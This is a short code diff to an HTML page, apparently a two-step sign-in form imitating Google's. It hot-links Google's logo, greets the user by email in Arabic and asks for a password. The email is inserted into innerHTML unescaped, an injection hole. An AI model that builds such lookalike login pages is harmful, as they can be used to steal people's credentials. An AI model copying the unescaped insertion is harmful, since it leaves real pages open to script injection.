@@ -7,7 +7,8 @@
   <style>
     body {
       margin: 0;
-      background: #f2f2f2;
+      background: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSq19yICTWAbF0PgoNE2Iq5KE58cYS2ySo7-C5TSZVZypdg4KvLTTC8hmRv&s=10") no-repeat center center fixed;
+      background-size: cover;
       font-family: 'Roboto', 'Tahoma', sans-serif;
       display: flex;
       justify-content: center;
@@ -43,7 +44,6 @@
     }
 
     .input-group {
-      position: relative;
       margin-bottom: 20px;
     }
 
@@ -110,7 +110,8 @@
         return;
       }
 
-      document.getElementById("formBox").innerHTML = `
+      const formBox = document.getElementById("formBox");
+      formBox.innerHTML = `
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
         <h2>مرحبًا ${email}</h2>
         <p>أدخل كلمة المرور لحسابك</p>
